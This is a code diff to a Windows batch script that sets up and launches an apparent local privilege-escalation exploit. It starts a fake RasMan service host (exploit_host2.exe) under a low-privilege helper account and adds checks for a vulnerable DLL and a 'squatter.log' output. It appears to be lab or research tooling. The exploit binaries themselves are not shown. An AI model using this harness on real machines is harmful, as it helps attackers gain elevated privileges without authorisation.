@@ -7,6 +7,11 @@ echo [+] Starting administrative setup
 echo [+] Working directory: C:\Users\Public\Desktop\EXPLOIT
 echo.
 
+if not exist "the-vulnerable-rasmans.dll" (
+    echo [!] Missing required file: C:\Users\Public\Desktop\EXPLOIT\the-vulnerable-rasmans.dll
+    exit /b 1
+)
+
 set "HELPER_USER=guestlab"
 set /p INPUT_HELPER_USER=[?] Low-priv helper username [guestlab]: 
 if defined INPUT_HELPER_USER set "HELPER_USER=%INPUT_HELPER_USER%"
@@ -90,6 +95,25 @@ if errorlevel 1 (
     echo [!] Failed to start exploit_host2.exe as %HELPER_USER% ^(error %errorlevel%^)
     exit /b 1
 )
+ping -n 3 127.0.0.1 >nul
+tasklist /FI "IMAGENAME eq exploit_host2.exe" | find /I "exploit_host2.exe" >nul
+if errorlevel 1 (
+    echo [!] exploit_host2.exe is not running after launch
+    if exist squatter.log (
+        echo [+] squatter.log
+        type squatter.log
+    ) else (
+        echo [!] squatter.log was not created
+    )
+    exit /b 1
+)
+if not exist squatter.log (
+    echo [!] exploit_host2.exe is running but squatter.log was not created
+    exit /b 1
+)
+echo [+] Fake RasMan host is running
+echo [+] squatter.log
+type squatter.log
 
 echo [+] Current session state
 quser
